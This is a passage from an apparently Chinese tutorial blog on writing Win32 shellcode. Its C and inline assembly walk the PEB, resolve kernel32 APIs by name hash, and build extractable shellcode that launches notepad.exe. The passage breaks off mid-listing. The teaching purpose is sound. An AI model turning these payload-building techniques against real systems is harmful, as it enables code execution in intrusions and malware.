class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    <code>cl GetKernel_32_FuncAddr.cpp &amp; GetKernel_32_FuncAddr.exe</code>编译运行，输出：</p>
<p><img src="/images/win32-shellcode/image-20221130124515582.png" alt="image-20221130124515582" style="zoom:110%;" /></p>
<p>​    用windbg验证一波：</p>
<p><img src="/images/win32-shellcode/image-20221130125753442.png" alt="image-20221130125753442" style="zoom:67%;" /></p>
<p><img src="/images/win32-shellcode/image-20221130130214629.png" alt="image-20221130130214629" style="zoom:67%;" /></p>
<p><img src="/images/win32-shellcode/image-20221130131043410.png" alt="image-20221130131043410" style="zoom:67%;" /></p>
<p><img src="/images/win32-shellcode/image-20221130131448126.png" alt="image-20221130131448126" style="zoom:67%;" /></p>
<p>​    与程序运行结果很切合，说明我们分析的很正确，嘿嘿。</p>
<p>​    为了在shellcode中使用加载模块中的输出函数，则需要在<strong>执行shellcode时动态查找函数的地址</strong>，这就需要通过某种方法把函数的相关信息 (如函数名字) 编码到shellcode中，再根据函数的相关信息找到函数的地址。</p>
<p>​    由于Windows API的名字都比较长，为了减少shellcode的长度，可以用整数值代替API的名字，即用哈希(hash)值代替API的名字。以下是一种常用的hash算法:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">GetHash</span><span class="params">(<span class="type">char</span> * c)</span> <span class="comment">// c 表示输入的API名称</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> h=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*c)</span><br><span class="line">    &#123;</span><br><span class="line">        h = ( ( h &lt;&lt; <span class="number">25</span> ) | ( h &gt;&gt; <span class="number">7</span> ) ) + *(c++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h; <span class="comment">// h表示输出的4字节整数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    把上述哈希函数转成汇编语言，就变为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//hash_proc: you should put the address of the string to edi</span><br><span class="line">//when ret, the hash value stores in eax</span><br><span class="line">hash_proc:</span><br><span class="line">    // save ebx,ecx,edx,edi</span><br><span class="line">    push    ebx         ;</span><br><span class="line">    push    ecx         ;</span><br><span class="line">    push    edx         ;</span><br><span class="line">    push    edi         ;</span><br><span class="line">    xor     edx,edx     ; edx = h</span><br><span class="line">hash_loop:              ;</span><br><span class="line">    movsx   eax,byte ptr [edi]  ; [eax]=*c ==&gt; eax</span><br><span class="line">    cmp     eax,0       ;</span><br><span class="line">    je  exit_hash_proc  ;</span><br><span class="line">    mov     ebx,edx     ; h ==&gt; ebx</span><br><span class="line">    mov     ecx,edx     ; h ==&gt; ecx</span><br><span class="line">    shl     ebx,19h     ; h &lt;&lt; 25</span><br><span class="line">    shr     ecx,7       ; h &gt;&gt; 7</span><br><span class="line">    or      ebx,ecx     ; ((h &lt;&lt; 25) | (h &gt;&gt; 7))</span><br><span class="line">    mov     edx,ebx     ;</span><br><span class="line">    add     edx,eax     ;</span><br><span class="line">    inc     edi;        ;</span><br><span class="line">    jmp hash_loop       ;</span><br><span class="line">exit_hash_proc:         ;</span><br><span class="line">	mov     eax,edx     ; save hash to eax</span><br><span class="line">    // restore ebx,ecx,edx,edi</span><br><span class="line">    pop     edi         ;</span><br><span class="line">    pop     edx         ;</span><br><span class="line">    pop     ecx         ;</span><br><span class="line">    pop     ebx         ;</span><br><span class="line">    retn                ;</span><br></pre></td></tr></table></figure>
<p>​    这样就把API转换为一个4字节的整数，在shellcode的内部就可以用该整数表示相应的API。</p>
<p>​    以下是获得Windows地址的完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// findFuncAddr.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">GetHash</span><span class="params">(<span class="type">char</span> * c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> h=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*c)</span><br><span class="line">    &#123;</span><br><span class="line">        h = ( ( h &lt;&lt; <span class="number">25</span> ) | ( h &gt;&gt; <span class="number">7</span> ) ) + *(c++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">findFuncAddr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> lHash)</span></span><br><span class="line"><span class="comment">// lHash: hash of the function name.</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> lHashFunAddr;</span><br><span class="line"></span><br><span class="line">    __asm&#123;</span><br><span class="line">        	<span class="comment">// load lHash to edx</span></span><br><span class="line">            push    lHash;      </span><br><span class="line">            pop     edx;</span><br><span class="line">            <span class="comment">//  call some functions to do the job.</span></span><br><span class="line">            call    get_base_address;</span><br><span class="line">        	<span class="comment">// the base address is 0, done.</span></span><br><span class="line">            cmp     eax,<span class="number">0</span>;   </span><br><span class="line">            jle     end_of_findFuncAddr; <span class="keyword">if</span> ecx &lt;=<span class="number">0</span> done.</span><br><span class="line">            <span class="comment">// save the base to ebx;</span></span><br><span class="line">            mov     ebx,eax;   </span><br><span class="line">            call    get_function_addr;</span><br><span class="line">        	<span class="comment">// finish all job. </span></span><br><span class="line">            jmp     end_of_findFuncAddr; </span><br><span class="line">   </span><br><span class="line">        <span class="comment">// Define some sub processes here.  ===========================================</span></span><br><span class="line">        <span class="comment">// begin of get_base_address    ==================================</span></span><br><span class="line">        <span class="comment">// get_base_address: put the DLL nIndex to ecx. eax=return value</span></span><br><span class="line">        get_base_address:</span><br><span class="line">            mov     eax, fs:<span class="number">30</span>h     ; PEB base</span><br><span class="line">            mov     eax, [eax+<span class="number">0</span>ch]  ; PEB_LER_DATA</span><br><span class="line">            <span class="comment">// base of first element</span></span><br><span class="line">            mov     eax,[eax+<span class="number">1</span>ch]  ; The first element of InInitOrderModuleList</span><br><span class="line">            mov     eax,[eax]       ; Next element</span><br><span class="line">            mov     eax,[eax+<span class="number">8</span>]     ; eax = Base address of the module</span><br><span class="line">            retn;</span><br><span class="line">            <span class="comment">// end of get_base_address  ======================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// begin of get_function_addr    =================================</span></span><br><span class="line">            <span class="comment">// get_function_addr, in: ebx=base, edx=hash(name); out:eax=return value</span></span><br><span class="line">        get_function_addr:</span><br><span class="line">            <span class="comment">// get the addrs of first function =========</span></span><br><span class="line">            mov     eax,[ebx+<span class="number">3</span>ch]       ; e_lfanew</span><br><span class="line">            mov     eax,[eax+ebx+<span class="number">78</span>h]   ; DataDirectory[<span class="number">0</span>]</span><br><span class="line">            add     eax,ebx             ; RVA + base</span><br><span class="line">            mov     esi,eax             ; Save first DataDirectory to esi</span><br><span class="line">            <span class="comment">// get fields of IMAGE_EXPORT_DIRECTORY pNameOfModule</span></span><br><span class="line">            <span class="comment">//mov     eax,[esi+0ch]       ; Name RVA, real address should &quot;add eax,ebx&quot;</span></span><br><span class="line">            <span class="comment">//mov     eax,[esi+14h]       ; NumberOfFunctions</span></span><br><span class="line">            <span class="comment">//mov     eax,[esi+18h]       ; NumberOfNames</span></span><br><span class="line">            <span class="comment">//mov     eax,[esi+1ch]       ; AddressOfFunctions RVA</span></span><br><span class="line">            <span class="comment">//mov     eax,[esi+20h]       ; AddressOfNames RVA</span></span><br><span class="line">            <span class="comment">//mov     eax,[esi+24h]       ; AddressOfNameOrdinals RVA</span></span><br><span class="line">            mov     ecx,[esi+<span class="number">18</span>h]           ; NumberOfNames</span><br><span class="line">        compare_names_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">20</span>h]          ; AddressOfNames RVA</span><br><span class="line">            add     eax, ebx                ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]      ; NamesAddress RVA</span><br><span class="line">            add     eax, ebx                ; rva2va, now eax store the address of the name</span><br><span class="line"></span><br><span class="line">            push    edi                     ; save edi to <span class="built_in">stack</span></span><br><span class="line">            mov     edi,eax                 ; put the address of the <span class="built_in">string</span> to edi</span><br><span class="line">            call    hash_proc;              ; gethash</span><br><span class="line">            pop     edi                     ; restor edi from <span class="built_in">stack</span></span><br><span class="line"></span><br><span class="line">            cmp     eax,edx;                ; compare to hash;</span><br><span class="line">            je      done_find_hash;</span><br><span class="line">            <span class="comment">//cmp     ebx, [edi]            ; compare to hash</span></span><br><span class="line">            <span class="comment">//jnz     short find_start</span></span><br><span class="line">        loop compare_names_hash;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            jmp     done_get_function_addr;</span><br><span class="line">        done_find_hash:</span><br><span class="line">            mov     eax, [esi+<span class="number">1</span>ch]          ; AddressOfFunctions RVA</span><br><span class="line">            add     eax, ebx                ; rva2va</span><br><span class="line">            mov     eax, [eax+ecx*<span class="number">4</span><span class="number">-4</span>]      ; FunctionAddress RVA</span><br><span class="line">                add     eax, ebx            ; rva2va, now eax store the address of the Function</span><br><span class="line">        done_get_function_addr:</span><br><span class="line">            retn;</span><br><span class="line">        <span class="comment">// end of get_function_addr ======================================</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// begin of hash_process    ======================================</span></span><br><span class="line">        <span class="comment">// hash_proc: you should put the address of the string to edi</span></span><br><span class="line">        <span class="comment">// when ret, the hash value stores in eax</span></span><br><span class="line">        hash_proc:</span><br><span class="line">            <span class="comment">// save ebx,ecx,edx,edi</span></span><br><span class="line">            push    ebx         ;</span><br><span class="line">            push    ecx         ;</span><br><span class="line">            push    edx         ;</span><br><span class="line">            push    edi         ;</span><br><span class="line">            xor     edx,edx     ; edx = h</span><br><span class="line">        hash_loop:              ;</span><br><span class="line">            movsx   eax,byte ptr [edi]  ; [eax]=*c ==&gt; eax</span><br><span class="line">            cmp     eax,<span class="number">0</span>       ;</span><br><span class="line">            je  exit_hash_proc  ;</span><br><span class="line">            mov     ebx,edx     ;  h ==&gt; ebx</span><br><span class="line">            mov     ecx,edx     ;  h ==&gt; ecx</span><br><span class="line">            shl     ebx,<span class="number">19</span>h     ; h &lt;&lt; <span class="number">25</span></span><br><span class="line">            shr     ecx,<span class="number">7</span>       ; ( h &gt;&gt; <span class="number">7</span> )</span><br><span class="line">            or      ebx,ecx     ; ( ( h &lt;&lt; <span class="number">25</span> ) | ( h &gt;&gt; <span class="number">7</span> ) )</span><br><span class="line">            mov     edx,ebx     ;</span><br><span class="line">            add     edx,eax     ;</span><br><span class="line">            inc     edi;        ;</span><br><span class="line">            jmp hash_loop       ;</span><br><span class="line">        exit_hash_proc:         ;</span><br><span class="line">            mov     eax,edx     ; save hash to eax</span><br><span class="line">            <span class="comment">// restore ebx,ecx,edx,edi</span></span><br><span class="line">            pop     edi         ;</span><br><span class="line">            pop     edx         ;</span><br><span class="line">            pop     ecx         ;</span><br><span class="line">            pop     ebx         ;</span><br><span class="line">            retn                ;</span><br><span class="line">    	<span class="comment">// end of hash_process    ========================================</span></span><br><span class="line">    	end_of_findFuncAddr:</span><br><span class="line">            mov lHashFunAddr,eax;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> lHashFunAddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LoadLibraryA\t=%p\tfindHashaddr: %p\n&quot;</span>,</span><br><span class="line">        LoadLibraryA, findFuncAddr(GetHash(<span class="string">&quot;LoadLibraryA&quot;</span>)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateProcessA\t=%p\tfindHashaddr: %p\n&quot;</span>,</span><br><span class="line">        CreateProcessA,findFuncAddr(GetHash(<span class="string">&quot;CreateProcessA&quot;</span>))); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    最后，Windows2003 SP2系统KERNEL32.dIl的部分函数及其hash列出如下：</p>
<p><img src="/images/win32-shellcode/image-20221130132720627.png" alt="image-20221130132720627" style="zoom:67%;" /></p>
<p>​    <strong>之后，我们开始快乐的编写shellcode啦！</strong></p>
<p>​    首先，编写shellcode要经过以下3个步骤：</p>
<ol>
<li>编写简洁的能完成所需功能的C程序。</li>
<li>分析可执行代码的反汇编语句，用汇编语言实现相同的功能。</li>
<li>提取出操作码，写成shellcode，并用C程序验证。</li>
</ol>
<p>​    <strong>我们以启动新进程的shellcode为例，说明Win32环境下的shellcode编写方法。</strong></p>
<p>​    Windows系统中用CreateProcess打开一个新的进程，根据是否设置了UNICODE变量，编译器使用该函数的Unicode 版本(CreateProcessW)或ANSI 版本(CreateProcessA)。以下例程(do32Command.cpp)使用CreateProcessA启动一个新的进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doCommandLine</span><span class="params">(<span class="type">char</span> * szCmdLine)</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL ret;</span><br><span class="line">    STARTUPINFO si; <span class="comment">// 在创建时指定进程主窗口的窗口站、桌面、标准句柄和外观。</span></span><br><span class="line">    PROCESS_INFORMATION pi; <span class="comment">// 有关新创建的进程及其主线程的信息。</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    si.wShowWindow=TRUE;</span><br><span class="line">    si.dwFlags=STARTF_USESHOWWINDOW;</span><br><span class="line"></span><br><span class="line">    ret=CreateProcessA(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        szCmdLine,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        FALSE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;si,</span><br><span class="line">        &amp;pi</span><br><span class="line">        );</span><br><span class="line">    ExitProcess(ret);  <span class="comment">// 用这个较稳妥，否则shellcode会出错</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    doCommandLine(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    <code>cl do32Command.cpp &amp; do32Command.exe</code>编译运行，成功打开记事本。</p>
<p>​    接下来，把上述c程序转化成汇编。分析doCommandLine(char * szCmdLine)函数。</p>
<ol>
<li>初始化相关的变量。执行CreateProcessA之前的几条语句在栈中开辟了一块内存，以保存结构变量si(STARTUPINFO)和pi(PROCESS_INFORMATION)，并设置si.cb的值为44h。由于sizeof(si)=44h，sizeof(pi)=10h，用sub esp,54h就可以在栈中开辟这块内存。用mov指令给si.cb赋值。</li>
<li>用上一节的方法找到并保存CreateProcessA的地址。</li>
<li>用push指令将CreateProcessA的参数逆序推入堆栈</li>
<li>用call指令调用CreateProcessA：以CreateProcessA的内存地址执行call。</li>
</ol>
<p>​    相应代码如下（其中8个连续的 NOP（0x90）指令用于定位代码的开始与结束）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EIGHT_NOPS __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\</span></span><br><span class="line"><span class="meta">                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_BEGIN  EIGHT_NOPS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_END    EIGHT_NOPS</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">doCommandLineAsm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">            PROC_BEGIN;     <span class="comment">// Begin of the code</span></span><br><span class="line">            push    <span class="number">00657865</span>h   ;</span><br><span class="line">            push    <span class="number">2e646170</span>h   ;</span><br><span class="line">            push    <span class="number">65746f</span>6eh   ; <span class="string">&quot;notepad.exe&quot;</span></span><br><span class="line">            mov     edi, esp    ; edi=<span class="string">&quot;notepad.exe&quot;</span></span><br><span class="line">            push    <span class="number">0xff0d6657</span>  ; <span class="comment">//hash(&quot;CloseHandle&quot;)=0xff0d6657</span></span><br><span class="line">            push    <span class="number">0x4fd18963</span>  ; <span class="comment">//hash(&quot;ExitProcess&quot;)=0x4fd18963</span></span><br><span class="line">            push    <span class="number">0x6ba6bcc9</span>  ; <span class="comment">//hash(CreateProcessA)=0x6ba6bcc9</span></span><br><span class="line"></span><br><span class="line">            pop     edx;        ; <span class="comment">//edx=GetHash(&quot;CreateProcessA&quot;);</span></span><br><span class="line">            call    findHashFuncAddrProc;   <span class="comment">// eax=address of function</span></span><br><span class="line">            mov     esi,eax;    ;<span class="comment">// esi=CreateProcessA</span></span><br><span class="line">            pop     edx;        ;<span class="comment">// edx=GetHash(&quot;ExitProcess&quot;);</span></span><br><span class="line">            call    findHashFuncAddrProc;   <span class="comment">// eax=address of function</span></span><br><span class="line">            mov     ebx,eax;    ;<span class="comment">// ebx=CloseHandle</span></span><br><span class="line"></span><br><span class="line">            call    doCommandProc;          <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">            jmp     end_of_this_function;    <span class="comment">// finish all job. </span></span><br><span class="line">   </span><br><span class="line">      	doCommandProc:</span><br><span class="line">            push    ecx;</span><br><span class="line">            push    edx;</span><br><span class="line">            push    esi;</span><br><span class="line">            push    edi;</span><br><span class="line">            push    ebp;</span><br><span class="line">            mov     ebp,esp;</span><br><span class="line"></span><br><span class="line">            mov     edx,edi;    <span class="comment">//edx=szCmdLine</span></span><br><span class="line">            sub     esp, <span class="number">54</span>h;</span><br><span class="line">            mov     edi, esp;</span><br><span class="line">            push    <span class="number">14</span>h;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            xor     eax,eax;</span><br><span class="line">            stack_zero:</span><br><span class="line">            mov     [edi+ecx*<span class="number">4</span>], eax;</span><br><span class="line">            loop    stack_zero;</span><br><span class="line"></span><br><span class="line">            mov     byte ptr [edi+<span class="number">10</span>h], <span class="number">44</span>h         ; si.cb = <span class="keyword">sizeof</span>(si)</span><br><span class="line">            lea     eax, [edi+<span class="number">10</span>h]</span><br><span class="line">            push    edi;    <span class="comment">//push    piPtr;</span></span><br><span class="line">            push    eax;    <span class="comment">//push    siPtr;</span></span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="number">0</span>;</span><br><span class="line">            push    FALSE;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            push    edx;    <span class="comment">//edx=szCmdLine</span></span><br><span class="line">            push    <span class="literal">NULL</span>;</span><br><span class="line">            call    esi;    <span class="comment">//eax=return value;ptrCreateProcessA;</span></span><br><span class="line">            cmp     eax,<span class="number">0</span>;</span><br><span class="line">            je     donot_closehandle;</span><br><span class="line">            push    eax;</span><br><span class="line">            call    ebx;    <span class="comment">//ExitProcess;</span></span><br><span class="line"></span><br><span class="line">        donot_closehandle:</span><br><span class="line">            mov     esp,ebp;</span><br><span class="line">            pop     ebp;</span><br><span class="line">            pop     edi;</span><br><span class="line">            pop     esi;</span><br><span class="line">            pop     edx;</span><br><span class="line">            pop     ecx;</span><br><span class="line">            retn;</span><br><span class="line"></span><br><span class="line">        findHashFuncAddrProc:</span><br><span class="line">            push    esi;</span><br><span class="line">            push    ebx;</span><br><span class="line">            push    ecx;</span><br><span class="line">            push    edx;</span><br><span class="line">            call    get_base_address;</span><br><span class="line">            cmp     eax,<span class="number">0</span>   ;   <span class="comment">// the base address is 0, done.</span></span><br><span class="line">            jle     end_of_findHashFuncAddrProc; <span class="keyword">if</span> ecx &lt;=<span class="number">0</span> done.</span><br><span class="line">            